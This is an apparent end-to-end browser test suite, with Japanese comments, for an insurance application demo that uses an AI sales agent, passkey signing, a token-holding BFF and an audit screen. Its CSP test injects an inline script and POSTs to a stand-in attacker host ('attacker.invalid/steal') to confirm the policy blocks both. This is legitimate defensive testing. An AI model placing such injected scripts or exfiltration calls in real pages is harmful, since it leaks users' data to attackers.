// 画面の基本の流れ: ログイン（初めての端末では、ログインサーバーの画面で passkey を登録）→ 相談 → 署名を確かめた案 → 確認 → 署名 → 提出 → 直送の照合（architecture の 3 章）。
// ブラウザは入口を通る。トークンと DPoP の鍵は BFF に、passkey はブラウザの仮想の認証器にある（D-41、D-42）。secure では、本物の Claude が案を示す。
import type { Page } from "playwright-core";
import { afterEach, describe, expect, it } from "vitest";
import { publicOrigin, records, setDefenses, type Ns } from "../cluster/world.ts";
import { BrowserAuditor, BrowserCustomer, PLANS } from "./browser.ts";

let alice: BrowserCustomer | undefined;
let auditor: BrowserAuditor | undefined;
afterEach(async () => {
  await alice?.close();
  await auditor?.close();
  alice = undefined;
  auditor = undefined;
});

describe.each<Ns>(["secure", "vulnerable"])("画面の基本の流れ（%s）", (ns) => {
  it("顧客が画面で選んで署名した案が記録され、直接届いた契約内容と照合で一致する", async () => {
    if (ns === "vulnerable") await setDefenses({});
    alice = await new BrowserCustomer(ns, "alice").ready();
    await alice.chat();
    expect(await alice.error()).toBeNull();
    expect(await alice.offerWarning()).toBeNull();

    // secure の案は、本物の Claude が組み立てるので、番号を固定せず、出た案から選ぶ
    const chosen = ns === "secure" ? (await alice.shownPlans())[0]! : PLANS["fixed-60"]!;
    await alice.choose(chosen.id);
    expect(await alice.approveIfShows(chosen)).toBe(true);
    expect(await alice.error()).toBeNull();

    const nonce = await alice.nonce;
    // 署名に使えた passkey に、「この端末で使った」の印が付く（D-43）
    await alice.page.getByTestId("tab-passkeys").click();
    expect(await alice.page.locator("[data-testid=passkey-item][data-used=true]").count()).toBe(1);
    await alice.page.getByTestId("tab-apply").click();
    const record = (await records(ns)).contracts.find((c) => c.contract.nonce === nonce);
    expect(record?.by).toEqual(["insurer-mcp", "sales-agent"]);
    expect(record?.contract.plan.id).toBe(chosen.id);
    // 会話の最後には、今回の申込みの行だけが出る
    expect(await alice.reconcile()).toBe("match");
    expect(await alice.page.locator("[data-testid^=reconcile-]").count()).toBe(1);
    // 「受信箱と契約」の画面にも、今回の契約が一致として出る
    expect((await alice.inbox()).status).toBe("match");

    // 監査の担当が、監査の画面で、その契約を食い違いなしと見て、会話の記録を読める（G25、D-31）
    auditor = new BrowserAuditor(ns);
    expect(await auditor.open()).toBe(200);
    const audited = await auditor.contract(nonce, (status, rows) => status === "食い違いなし" && rows > 0);
    expect(audited.status).toBe("食い違いなし");
    expect(audited.conversationRows).toBeGreaterThan(0);
    // 詳細の冒頭に、何と何を比べたかが出る
    expect(await auditor.page.getByTestId("comparison").count()).toBeGreaterThan(0);
  });
});

describe("顧客の希望から案を組み立てる（secure の本物の Claude。P-17）", () => {
  it("希望に近い案が出て、条件を変えて頼み直すと新しい提示になり、最初の文が意向確認書面に残る", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    const wish = "年に 80 万円を 15 年受け取れる個人年金を考えています。";
    // 質問（掛け金など）には、希望の年額を保つ答えを書く。最初の選択肢を選ぶと、希望より安い掛け金に決まることがある
    await alice.chat(wish, "年に 80 万円を 15 年受け取れる掛け金でかまいません。");
    expect(await alice.error()).toBeNull();
    // 掛け金を変えて探すので、ぴったりとは限らない。受取期間が 15 年で、年額が 80 万円の前後 1 割の案があるかを見る
    const near = (await alice.shownPlans()).map((p) => /確定年金 15年・年額(\d+)万円/.exec(p.name)?.[1]).filter(Boolean).map(Number);
    expect(near.some((man) => man >= 72 && man <= 88)).toBe(true);
    const firstNonce = await alice.page.locator("[data-testid=offers]").last().getAttribute("data-nonce");

    const page = alice.page;
    await page.getByTestId("offers-other-input").fill("掛け金をもう少し抑えた案も見たいです。");
    await page.getByTestId("offers-other-send").click();
    // 古い案は、新しい案が届くまで画面に残るので、nonce が変わるまで待つ。その間の質問には、最初の選択肢で答える
    await expect
      .poll(
        async () => {
          const ask = page.locator("[data-testid=ask-option-0]:visible:enabled");
          if (await ask.count()) await ask.click();
          return page.locator("[data-testid=offers]").last().getAttribute("data-nonce");
        },
        { timeout: 180_000, interval: 1_000 },
      )
      .not.toBe(firstNonce);
    expect(await alice.error()).toBeNull();

    const chosen = (await alice.shownPlans())[0]!;
    await alice.choose(chosen.id);
    await page.getByTestId("sign-intent").waitFor({ timeout: 120_000 });
    expect(await page.getByTestId("intent-initial-wish").textContent()).toContain(wish);
    expect(await alice.approveIfShows(chosen)).toBe(true);
    expect(await alice.reconcile()).toBe("match");
  });
});

describe("画面の CSP（G32）", () => {
  it("secure: 仕込まれたインラインのスクリプトは動かず、許していない宛先へはつなげない", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    const page = alice.page;
    const result = await page.evaluate(async () => {
      const script = document.createElement("script");
      script.textContent = "window.__injected = true;";
      document.head.append(script);
      const sent = await fetch("http://attacker.invalid/steal", { method: "POST", body: "x" }).then(() => "sent", (e: Error) => e.name);
      const header = await fetch("/").then((r) => r.headers.get("content-security-policy"));
      return { injected: (window as unknown as { __injected?: boolean }).__injected ?? false, sent, header };
    });
    expect(result.injected).toBe(false);
    expect(result.sent).toBe("TypeError");
    expect(result.header).toContain("script-src 'self'");
    // 画面そのものは、CSP の下で動いている（ログインと登録まで済んでいる）
    expect(await page.getByTestId("free-input").isVisible()).toBe(true);
  });
});

describe("BFF（D-41）: 画面はトークンを持たない", () => {
  it("ログインしても、画面の保存領域にトークンも DPoP の鍵もなく、セッションの Cookie はスクリプトから読めない", async () => {
    alice = await new BrowserCustomer("vulnerable", "alice").ready();
    const page = alice.page;
    const seen = await page.evaluate(async () => ({
      storage: [...Object.values(sessionStorage), ...Object.values(localStorage)].join("\n"),
      databases: (await indexedDB.databases()).map((d) => d.name),
      cookie: document.cookie,
    }));
    expect(seen.storage).not.toMatch(/eyJ[\w-]+\.eyJ/);
    expect(seen.databases).not.toContain("oidc");
    expect(seen.cookie).toBe("");
    const session = (await alice.context.cookies()).find((c) => c.name === "__Host-Http-session");
    expect(session).toMatchObject({ httpOnly: true, secure: true, sameSite: "Strict", path: "/" });
  });

  it("事前確認の要るヘッダーのない要求は、BFF が断る（CSRF の対策）", async () => {
    alice = await new BrowserCustomer("vulnerable", "alice").ready();
    const statuses = await alice.page.evaluate(async () => {
      const post = (headers: Record<string, string>) => fetch("/bff/agui", { method: "POST", headers: { "content-type": "application/json", ...headers }, body: "{}" }).then((r) => r.status);
      return { without: await post({}), withHeader: await post({ "x-bff": "1" }) };
    });
    expect(statuses.without).toBe(403);
    // ヘッダーがあれば、BFF は営業 AI エージェントへ送る（中身が空なので、営業 AI エージェントが断る）
    expect(statuses.withHeader).not.toBe(403);
  });

  it("サインアウトすると、BFF のセッションは使えない", async () => {
    alice = await new BrowserCustomer("vulnerable", "alice").ready();
    await alice.page.getByTestId("signout").click();
    await alice.page.getByTestId("login").waitFor({ timeout: 30_000 });
    expect(await alice.page.evaluate(() => fetch("/bff/session").then((r) => r.status))).toBe(401);
  });

  it("BFF が更新できなければ、ログインし直しのカードを出す", async () => {
    alice = await new BrowserCustomer("vulnerable", "alice").ready();
    const page = alice.page;
    await page.route("**/bff/agui", (route) => (route.request().method() === "POST" ? route.fulfill({ status: 401, json: { error: "expired" } }) : route.continue()));
    await page.getByTestId("free-input").fill("老後に備えたい");
    await page.getByTestId("free-send").click();
    await page.getByTestId("relogin").waitFor();
  });
});

describe("カードで進む申込み（vulnerable の台本）", () => {
  const start = async () => {
    await setDefenses({});
    alice = await new BrowserCustomer("vulnerable", "alice").ready();
    return alice.page;
  };
  const send = async (page: Page, text: string) => {
    await page.getByTestId("free-input").fill(text);
    await page.getByTestId("free-send").click();
  };

  it("「その他」の文が意向確認書面に出て、入力欄は許したカードにだけある", async () => {
    const page = await start();
    await send(page, "老後に備えたい");
    await expect.poll(() => page.getByTestId("ask-other-input").isVisible()).toBe(true);
    expect(await page.getByTestId("free-input").count()).toBe(0);
    await page.getByTestId("ask-other-input").fill("10 年だけ受け取りたい");
    await page.getByTestId("ask-other-send").click();
    await page.getByTestId("choose-fixed-60").waitFor();
    // 案のカードの入力欄は、条件を変えて頼み直す欄だけである。段階も進む
    expect(await page.locator("textarea:visible").count()).toBe(1);
    expect(await page.getByTestId("offers-other-input").isVisible()).toBe(true);
    expect(await page.locator("#steps li[aria-current]").getAttribute("data-step")).toBe("offers");
    expect(await page.locator("#steps li.done").getAttribute("data-step")).toBe("consult");
    await page.getByTestId("choose-fixed-60").click();
    await page.getByTestId("sign-intent").waitFor();
    expect(await page.locator("textarea:visible").count()).toBe(0);
    expect(await page.getByTestId("intent-confirm").textContent()).toContain("10 年だけ受け取りたい");
    // 終わったカードは閉じ、答えを 1 行で読める。開けば中身を読める
    const offers = page.getByTestId("offers");
    expect(await offers.getAttribute("open")).toBeNull();
    expect(await offers.locator("summary").textContent()).toContain(PLANS["fixed-60"]!.name);
  });

  it("「null」と答えても止まらない", async () => {
    const page = await start();
    await send(page, "老後に備えたい");
    await page.getByTestId("ask-other-input").fill("null");
    await page.getByTestId("ask-other-send").click();
    await page.getByTestId("choose-fixed-60").waitFor();
  });

  it("道具なしで番が終わると、続きのカードが出て、そこから案へ進める", async () => {
    const page = await start();
    await send(page, "契約の一覧を見せて");
    await page.locator("[data-tool=continue] .agent").waitFor();
    expect(await page.locator("[data-tool=continue] .agent").textContent()).toMatch(/契約は \d+ 件/);
    await send(page, "老後に備えたい");
    await page.getByTestId("ask-option-0").waitFor();
  });

  it("新しい申し込みで、案のカードから始め直し、別の nonce で申し込める。完了の後は、照合が押さなくても出る", async () => {
    const page = await start();
    expect(await page.getByTestId("new-application").isVisible()).toBe(false);
    await alice!.chat("老後に備えたい");
    const first = await alice!.nonce;
    await page.getByTestId("new-application").click();
    await page.getByTestId("free-input").waitFor();
    expect(await page.getByTestId("offers").count()).toBe(0);
    expect(await page.locator("#steps li[aria-current]").getAttribute("data-step")).toBe("consult");

    await alice!.chat("老後に備えたい");
    const second = await alice!.nonce;
    expect(second).not.toBe(first);
    await alice!.choose("fixed-60");
    expect(await alice!.approveIfShows(PLANS["fixed-60"]!)).toBe(true);
    await expect.poll(() => page.getByTestId(`reconcile-${second}`).getAttribute("data-status"), { timeout: 15_000 }).toBe("match");
    // 完了の後は、確かめずに始め直せる
    await page.getByTestId("new-application").click();
    await page.getByTestId("free-input").waitFor();
    expect(await page.getByTestId("new-confirm-box").isVisible()).toBe(false);
  });

  it("passkey の確認画面を待つ間は、待っていることを示し、署名とページを離れる操作を止める。二度押しても、要求は 1 つである", async () => {
    const page = await start();
    await alice!.chat("老後に備えたい");
    await alice!.choose("fixed-60");
    await alice!.holdPasskey();
    await page.getByTestId("sign-intent").click();
    await page.getByTestId("signing-status").waitFor();
    for (const id of ["sign-intent", "cancel-intent", "new-application", "signout"]) {
      expect(await page.getByTestId(id).isDisabled(), id).toBe(true);
    }
    // 押せないボタンを押しても、要求は増えない
    await page.getByTestId("sign-intent").click({ force: true });
    expect(await alice!.heldPasskeys()).toHaveLength(1);
    // 署名を頼む passkey には、登録のときの経路を添える（D-44）
    expect((await alice!.heldPasskeys())[0]!.allow.every((a) => a.transports.length > 0)).toBe(true);
    await alice!.releasePasskey();
    await page.getByTestId("sign-application").waitFor();
    expect(await page.getByTestId("signing-status").count()).toBe(0);
    expect(await page.getByTestId("signout").isDisabled()).toBe(false);
  });

  it("提出の途中の新しい申し込みは、契約になりうることを確かめてから始め直す", async () => {
    const page = await start();
    await alice!.chat("老後に備えたい");
    await alice!.choose("fixed-60");
    await page.getByTestId("sign-intent").click();
    await page.getByTestId("sign-application").waitFor();
    // 提出の要求を遅らせて、途中の状態を作る
    await page.route("**/agui", async (route) => {
      await new Promise((r) => setTimeout(r, 3000));
      await route.continue().catch(() => undefined);
    });
    await page.getByTestId("sign-application").click();
    await page.getByTestId("agent-status").and(page.locator("[data-state=busy]")).waitFor();
    await page.getByTestId("new-application").click();
    await page.getByTestId("new-confirm-box").waitFor();
    await page.getByTestId("new-back").click();
    expect(await page.getByTestId("new-confirm-box").isVisible()).toBe(false);
    await page.getByTestId("new-application").click();
    await page.getByTestId("new-confirm").click();
    await page.getByTestId("free-input").waitFor();
    expect(await page.locator("[data-tool=application]").count()).toBe(0);
  });

  it("ログインが切れると、ログインし直しへ案内し、ログインし直すと最初から進める", async () => {
    const page = await start();
    // BFF が A を更新できず、401 を返した場合と同じにする（1 度だけ）
    let refused = false;
    await page.route("**/bff/agui", (route) => {
      if (route.request().method() !== "POST" || refused) return route.continue();
      refused = true;
      return route.fulfill({ status: 401, json: { error: "expired" } });
    });
    await send(page, "老後に備えたい");
    await page.getByTestId("relogin").click();
    await page.getByTestId("free-input").waitFor({ timeout: 30_000 });
    expect(await alice!.whoami()).toBe("alice");
  });

  it("署名した申込書を送れなかったときは、写しを残さない", async () => {
    const page = await start();
    await alice!.chat("老後に備えたい");
    const nonce = await alice!.nonce;
    await alice!.choose("fixed-60");
    await page.getByTestId("sign-intent").click();
    await page.getByTestId("sign-application").waitFor();
    // 提出の要求が、トークンの期限切れで断られる
    await page.route("**/agui", (route) => route.fulfill({ status: 401, headers: { "access-control-allow-origin": alice!.app }, json: { error: "expired" } }));
    await page.getByTestId("sign-application").click();
    await page.getByTestId("relogin").waitFor();
    expect(await page.evaluate(() => localStorage.getItem("copies:alice") ?? "[]")).not.toContain(nonce);
  });
});

describe("passkey（D-42、D-43）", () => {
  it("secure: 作ったあとは一覧に出て、保険会社にある一覧を Signal API で端末に伝える。署名は一覧の passkey だけに頼む", async () => {
    alice = new BrowserCustomer("secure", "alice");
    await alice.open(() => alice!.recordSignals());
    await alice.login();
    await alice.openRegisterPage();
    await alice.registerPasskey();
    const page = alice.page;
    await page.getByTestId("tab-passkeys").click();
    expect(await page.getByTestId("passkey-item").count()).toBeGreaterThan(0);
    expect(await page.getByTestId("passkey-prompt").isVisible()).toBe(false);
    const [signal] = (await alice.signals()).slice(-1);
    expect(signal?.rpId).toBe("secure.localhost");
    expect(Buffer.from(signal!.userId, "base64url").toString()).toBe("alice");
    expect(signal!.allAcceptedCredentialIds.length).toBe(await page.getByTestId("passkey-item").count());
    // 名前は、作った環境と日時にする（端末を見分けるため）。ログインサーバーは名前を尋ねない
    expect(await page.getByTestId("passkey-item").last().textContent()).toMatch(/で作成（/);
    expect(await alice.info()).toBe("パスキーを作りました。");
  });

  it("secure: 同じ端末で、使える passkey があるうちは、もう 1 つは作れない（保険会社の一覧に、使えない登録を増やさない）", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    const page = alice.page;
    await page.getByTestId("tab-passkeys").click();
    const before = await page.getByTestId("passkey-item").count();
    await alice.openRegisterPage();
    await page.locator("#registerWebAuthn").click();
    // ブラウザが、端末にある passkey と同じものの作成を断る。ログインサーバーの画面に残ったときは、取り消して戻る
    await Promise.race([page.waitForURL(`${alice.app}/**`), page.locator("#cancelWebAuthnAIA").click()]);
    await page.waitForURL(`${alice.app}/**`);
    expect(await alice.error()).toContain("パスキーを作れませんでした");
    await page.getByTestId("tab-passkeys").click();
    expect(await page.getByTestId("passkey-item").count()).toBe(before);
  });

  it("secure: 一覧の「消す」は、ログインサーバーの確認の画面を通して、保険会社の登録を消す", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    const page = alice.page;
    await page.getByTestId("tab-passkeys").click();
    const before = await page.getByTestId("passkey-item").count();
    await page.getByTestId("delete-passkey").last().click();
    // 確認の画面には、消す passkey の名前が出る。「やめる」もある
    await page.locator("#kc-decline").waitFor();
    expect(await page.locator("body").textContent()).toMatch(/で作成（/);
    await page.locator("#kc-accept").click();
    await page.waitForURL(`${alice.app}/**`);
    expect(await alice.info()).toBe("パスキーを消しました。");
    await page.getByTestId("tab-passkeys").click();
    expect(await page.getByTestId("passkey-item").count()).toBe(before - 1);
  });

  it("secure: 保険会社に passkey がない利用者には、ログインの後に作成を促し、「後で」で閉じられる。端末には、空の一覧を伝える", async () => {
    // carol は、この確かめのためだけの利用者で、passkey を作らない（作成の画面では取り消す）
    const carol = new BrowserCustomer("secure", "carol");
    try {
      await carol.open(() => carol.recordSignals());
      await carol.login();
      const page = carol.page;
      await page.getByTestId("passkey-prompt").waitFor();
      expect((await carol.signals()).at(-1)?.allAcceptedCredentialIds).toEqual([]);
      // 「作る」は、ログインサーバーの登録の画面へ進む。取り消すと、作れなかったと示し、また促す
      await page.getByTestId("create-passkey").click();
      await page.locator("#cancelWebAuthnAIA").click();
      await page.waitForURL(`${carol.app}/**`);
      expect(await carol.error()).toContain("パスキーを作れませんでした");
      await page.getByTestId("passkey-later").click();
      expect(await page.getByTestId("passkey-prompt").isVisible()).toBe(false);
      await page.getByTestId("tab-passkeys").click();
      expect(await page.getByTestId("passkeys-none").isVisible()).toBe(true);
    } finally {
      await carol.close();
    }
  });
});

describe("サインアウト", () => {
  it("secure: 顧客がサインアウトすると、次のログインで、ログインサーバーがまた本人を確かめる。確かめ方は、パスワードではなく、登録した passkey である", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    await alice.page.getByTestId("signout").click();
    await alice.page.getByTestId("login").waitFor();
    expect(await alice.page.getByTestId("whoami").isVisible()).toBe(false);
    const sent = await alice.loginWithPasskey();
    expect(await alice.whoami()).toBe("alice");
    expect(sent).toEqual({ passkey: true, password: false });
  });

  it("secure: ログインの画面で passkey の確認画面を待つ間は、待っていることを示し、ボタンを押せなくする", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    const page = alice.page;
    await page.getByTestId("signout").click();
    await page.getByTestId("login").click();
    const button = page.locator("#authenticateWebAuthnButton");
    await button.waitFor();
    await alice.holdPasskey();
    await button.click();
    await page.locator("#webauthn-waiting[role=status]").waitFor();
    expect(await button.getAttribute("aria-disabled")).toBe("true");
    // パスワードのフォームも送れない（送るとページが替わり、passkey の要求が切れる）
    expect(await page.locator("#kc-login").isDisabled()).toBe(true);
    expect(await page.locator("#username").isDisabled()).toBe(true);
    expect(await alice.heldPasskeys()).toHaveLength(1);
    await alice.releasePasskey();
    await page.waitForURL(`${alice.app}/**`);
    expect(await alice.whoami()).toBe("alice");
  });

  it("secure: 顧客のまま監査の画面を開くと断られ、サインアウトして、同じブラウザで監査の担当に替われる", async () => {
    alice = await new BrowserCustomer("secure", "alice").ready();
    const audit = publicOrigin("secure", "audit");
    await alice.page.goto(audit);
    await alice.page.getByTestId("forbidden").waitFor();
    await alice.page.getByTestId("signout").click();
    await alice.page.locator("#username").fill("kansa");
    await alice.page.locator("#password").fill("demo");
    await alice.page.locator("button[type=submit]").click();
    await alice.page.waitForURL(`${audit}/**`);
    expect(await alice.page.locator(".who").first().textContent()).toContain("kansa");
    // 監査の担当もサインアウトすると、次に開いたときに、またログインを求められる
    await alice.page.getByTestId("signout").click();
    await alice.page.locator("#username").waitFor();
  });
});

describe("監査の画面", () => {
  it("secure: 顧客は、ログインサーバーにログインできても、監査の画面を見られない", async () => {
    auditor = new BrowserAuditor("secure", "alice");
    expect(await auditor.open()).toBe(403);
  });
});

